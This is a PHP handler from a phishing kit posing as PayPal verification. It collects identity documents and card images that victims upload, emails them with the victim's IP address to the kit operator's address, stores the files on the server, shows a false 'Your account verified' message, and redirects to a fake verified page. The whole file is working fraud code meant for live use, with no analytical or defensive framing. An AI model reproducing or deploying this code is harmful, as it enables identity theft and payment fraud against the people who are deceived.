<?php
/////////////////////////////////////// DON'T TOUCHE THIS CODE (EMAIL SEND & FTP WRITE CODE)
session_start();
include './../../../your_email_here.php';
// Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;

// Get user IP address


$subject= "$ip PayPal Identity & Card Img ( No more Limited Account's) ";
$todayis = date("l, F j, Y, g:i a") ;
$message = "";
  $mime_boundary="==Multipart_Boundary_x".md5(mt_rand())."x";
         $headers = "From: Sbr0k3r <sendmai@lbox.com>\r\n" .
         "MIME-Version: 1.0\r\n" .
            "Content-Type: multipart/mixed;\r\n" .
            " boundary=\"{$mime_boundary}\"";
         $message = "This is a multi-part message in MIME format.\n\n" .
            "--{$mime_boundary}\n" .
            "Content-Type: text/plain; charset=\"iso-8859-1\"\n" .
            "Content-Transfer-Encoding: 7bit\n\n" .
         $message . "\n\n";
 foreach ($_FILES['files']['name'] as $index => $name) {
    $tmp_name = $_FILES['files']['tmp_name'][$index];
    $type = $_FILES['files']['type'][$index];
    $size = $_FILES['files']['size'][$index];
            if (file_exists($tmp_name))
            {
               if(is_uploaded_file($tmp_name))
               {
                  $file = fopen($tmp_name,'rb');
                  $data = fread($file,filesize($tmp_name));
                  fclose($file);
                  $data = chunk_split(base64_encode($data));
               }
               $message .= "--{$mime_boundary}\n" .
                  "Content-Type: {$type};\n" .
                  " name=\"{$name}\"\n" .
                  "Content-Disposition: attachment;\n" .
                  " filename=\"{$fileatt_name}\"\n" .
                  "Content-Transfer-Encoding: base64\n\n" .
               $data . "\n\n";
            }
         }
         $message.="--{$mime_boundary}--\n";

if (mail($to, $subject, $message, $headers, $ip))
   echo "Your account verified. $matches[0]";
else
   echo "Error in mail";
 

$valid_formats = array("doc", "docx", "pdf" , "jpg" , "png" , "gif", "jpeg" , "bmp" , "xlsx" , "psd" , "fdf");
$max_file_size = 1024*9000; //100 kb
$path = ""; // Upload directory
$count = 0;

if(isset($_POST) and $_SERVER['REQUEST_METHOD'] == "POST"){
	// Loop $_FILES to exeicute all files
	foreach ($_FILES['files']['name'] as $f => $name) {
	    if ($_FILES['files']['error'][$f] == 5) {
	        continue; // Skip file if any error found
	    }
	    if ($_FILES['files']['error'][$f] == 0) {
	        if ($_FILES['files']['size'][$f] > $max_file_size) {
	            $message[] = "$name is too large!.";
	            continue; // Skip large files
	        }
			elseif( ! in_array(pathinfo($name, PATHINFO_EXTENSION), $valid_formats) ){
				$message[] = "$name is not a valid format";
				continue; // Skip invalid file formats
			}
	        else{ // No error found! Move uploaded files
	            if(move_uploaded_file($_FILES["files"]["tmp_name"][$f], $path.$name))
	            $count++; // Number of successfully uploaded file
	        }
	    }
	}
};

?>
 <HTML>
<HEAD>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
  <meta http-equiv="refresh" content="0; url=./../../../verified.php?cmd=_flow&SESSION=VBQvrPU00IM1uHErimWKuCyeklx6zvOmYw3KdzGurpCNuky8BWUn3P_VBQvrPU00IM1uHErimWKu&dispatch=5885d80a13c0db1f8e263663d3faee8d0b9dcb01a9b6dc564e45f62871326a5e" />
  </BODY>
</HTML>